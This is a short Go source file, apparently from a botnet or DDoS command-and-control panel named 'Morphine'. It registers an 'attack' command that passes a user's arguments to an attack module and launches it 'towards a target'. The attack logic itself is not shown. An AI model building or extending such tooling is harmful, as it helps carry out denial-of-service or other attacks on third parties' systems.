package commands

import (
	attacks "Morphine/core/attack"
	"Morphine/core/clients/sessions"
	deployment "Morphine/core/configs"
	"Morphine/core/sources/language"
)

func init() {

	MakeCommand(&Command{
		CommandName:        "attack",
		Aliases:            []string{"attk", "launch"},
		CommandPermissions: make([]string, 0),
		CommandDescription: "launch an attack towards a target!",
		CommandFunction: func(s *sessions.Session, cmd []string) error {
			//this will ensure its done without any errors
			if len(cmd) <= 1 { //tries to validate the length
				return language.ExecuteLanguage([]string{"attacks", "syntax.itl"}, s.Channel, deployment.Engine, s, make(map[string]string))
			}

			//launches the attack properly
			//this will ensure its done without any erorrs
			return attacks.MakeAttack(cmd[1:], s).RunTarget()
		},
	})
}
